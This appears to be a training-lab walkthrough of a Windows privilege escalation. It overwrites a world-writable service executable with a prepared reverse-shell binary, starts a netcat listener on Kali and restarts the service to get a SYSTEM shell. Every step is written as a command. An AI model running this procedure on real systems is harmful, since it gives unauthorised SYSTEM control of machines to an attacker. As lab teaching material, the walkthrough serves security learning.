# 🐾 Task 6: Exploiting Services - Unsecured Service Executables
---

## 📜 Task Description
In this task, we will exploit a vulnerability in the `filepermsvc` service, which runs with SYSTEM privileges. The vulnerability lies in the service executable being writable by all users, allowing us to replace it with our custom file and obtain a reverse shell with SYSTEM privileges.

---

## 🔍 Step 1: Checking Service Configuration
First, check the configuration of the `filepermsvc` service to confirm it runs with SYSTEM privileges. Execute the following command:  
`sc.exe qc filepermsvc`

### 📋 Expected Output
- Ensure that the `SERVICE_START_NAME` indicates SYSTEM.

---

## 🔑 Step 2: Checking Permissions on the Executable
Now, use the `accesschk.exe` tool to verify write permissions on the executable for the `filepermsvc` service. Execute the following command:  
`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

### 📋 Expected Output
- Confirm that the executable `filepermservice.exe` is writable by all users.

---

## 📝 Step 3: Replacing the Executable
Replace the `filepermservice.exe` executable with your previously created `reverse.exe`. Run the following command:  
`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" -Force`

### 📋 Expected Output
- Confirm that the executable has been successfully replaced with `reverse.exe`.

---

## 🎧 Step 4: Setting Up the Listener
Before starting the service, ensure you have a listener running on Kali. Use the following command to start the listener:  
`nc -lvnp 53`

---

## 🚀 Step 5: Starting the Service
Now, start the `filepermsvc` service. It should execute `reverse.exe` and provide you with a reverse shell with SYSTEM privileges. Execute the following command:  
`net start filepermsvc`

### 📋 Expected Output
- Confirm that you have received a reverse shell on Kali.

## 🎉 Congratulations!
You have successfully exploited an unsecured service executable to gain a reverse shell with SYSTEM privileges! 🎊
